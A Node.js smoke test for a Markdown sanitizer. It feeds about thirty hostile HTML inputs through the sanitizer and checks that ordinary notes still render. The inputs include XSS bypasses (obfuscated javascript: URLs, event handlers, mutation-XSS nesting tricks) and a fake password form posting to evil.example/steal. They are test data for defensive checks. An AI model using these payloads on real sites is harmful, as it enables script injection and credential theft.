// Smoke test for the Markdown sanitizer (web/sanitize.js): hostile HTML must come out inert, ordinary notes must survive.
// Run: node scripts/smoke-sanitize.mjs   (needs the dev dependency jsdom)
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import { marked } from 'marked';
import { createSanitizer } from '../web/sanitize.js';

const { window } = new JSDOM('<!doctype html>');
const sanitize = createSanitizer(createDOMPurify(window));
const render = (md) => sanitize(marked.parse(md, { gfm: true, breaks: true }));
const dom = (html) => new window.DOMParser().parseFromString(html, 'text/html');

// 1. Hostile input. After sanitizing, nothing may be able to run script, submit data, or leave http(s)/mailto/relative.
const hostile = [
  '<a href=" javascript:alert(1)">leading space</a>',
  '<a href="java&#9;script:alert(1)">tab inside scheme</a>',
  '<a href="&#106;avascript:alert(1)">entity</a>',
  '<a href="JaVaScRiPt:alert(1)">case</a>',
  '<a href="data:text/html,<script>alert(1)</script>">data url</a>',
  '<a href="vbscript:msgbox(1)">vbscript</a>',
  '[md link](javascript:alert(1))',
  '<svg><a xlink:href="javascript:alert(1)"><text>svg link</text></a></svg>',
  '<svg onload="alert(1)"></svg>', '<math><mtext><script>alert(1)</script></mtext></math>',
  '<img src=x onerror="alert(1)">', '<img src="javascript:alert(1)">',
  '<script>alert(1)</script>', '<iframe src="https://evil.example"></iframe>', '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object>', '<embed src="https://evil.example/x">',
  '<form action="https://evil.example/steal"><input type="password" name="p" placeholder="访问密码"><button formaction="https://evil.example">登录</button></form>',
  '<input type="text" name="token" value="x">', '<textarea name="t"></textarea>', '<select><option>x</option></select>',
  '<button onclick="alert(1)">click</button>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">', '<base href="https://evil.example/">', '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>body{display:none}</style>', '<div style="position:fixed;inset:0;background:#fff">overlay</div>',
  '<div class="modal login-box btn primary" id="app">fake ui</div>',
  '<details ontoggle="alert(1)" open><summary>x</summary></details>',
  '<a href="https://ok.example" target="_top" onclick="alert(1)" ping="https://evil.example">attrs</a>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
];
const badTags = 'script,iframe,object,embed,form,button,textarea,select,option,style,link,meta,base,svg,math,noscript,frame,frameset,applet,audio,video,source';
for (const input of hostile) {
  for (const html of [sanitize(input), render(input)]) {
    const doc = dom(html);
    assert.equal(doc.querySelectorAll(badTags).length, 0, `forbidden tag survived: ${input}\n→ ${html}`);
    for (const n of doc.querySelectorAll('*')) {
      for (const a of n.attributes) {
        assert.ok(!/^on/i.test(a.name), `event handler survived: ${input}\n→ ${html}`);
        assert.ok(!['style', 'id', 'name', 'action', 'formaction', 'srcdoc', 'ping', 'target', 'xlink:href'].includes(a.name), `attribute ${a.name} survived: ${input}\n→ ${html}`);
        if (['href', 'src'].includes(a.name)) assert.ok(/^(https?:|mailto:|#|\/(?!\/))/i.test(a.value.trim()) || !/^[a-z][a-z0-9+.-]*:/i.test(a.value.replace(/[\s\u0000-\u001f]/g, '')), `unsafe URL survived: ${a.value}\n← ${input}`);
        if (a.name === 'class') assert.ok(a.value.split(/\s+/).every((c) => /^(wikilink|missing|field|fk|language-[\w+#.-]+)$/.test(c)), `class survived: ${a.value}`);
      }
    }
    for (const i of doc.querySelectorAll('input')) assert.ok(i.type === 'checkbox' && i.disabled, `editable input survived: ${input}`);
  }
}
console.log(`ok 1  ${hostile.length} hostile inputs come out inert (raw HTML and through Markdown)`);

// 2. Ordinary notes keep everything the UI relies on.
const keep = (md, selector, n = 1) => assert.equal(dom(render(md)).querySelectorAll(selector).length, n, `${selector} missing from: ${render(md)}`);
keep('## 15:46 · ACARD 净亏 54%  <small>Hermes</small>', 'h2 > small');
keep('[site](https://example.com/a?b=1) and <mailto:a@example.com>', 'a[href]', 2);
keep('<a class="wikilink" href="#/note/%E8%B4%A2%E5%8A%A1%2F2026-11-01.md" title="财务/2026-11-01.md">财务</a>', 'a.wikilink[href^="#/note/"][title]');
keep('<a class="wikilink missing" href="#" data-missing="还没写">还没写</a>', 'a.wikilink.missing[data-missing]');
keep('<span class="field"><span class="fk">amount</span>262.43</span>', 'span.field > span.fk');
keep('- [x] done\n- [ ] todo', 'li > input[type=checkbox][disabled]', 2);
keep('| a | b |\n|---|:-:|\n| 1 | 2 |', 'table td', 2);
keep('```js\nconst a = 1 < 2;\n```', 'pre > code.language-js');
keep('**b** *i* ~~s~~ `c`\n\n> quote', 'strong, em, del, code, blockquote', 5);
keep('![alt](https://example.com/p.png)', 'img[src^="https://"][alt][referrerpolicy="no-referrer"]');
assert.ok(render('a < b && c > d').includes('a &lt; b &amp;&amp; c &gt; d'));
console.log('ok 2  headings, links, wiki links, inline fields, task lists, tables, code and images survive');
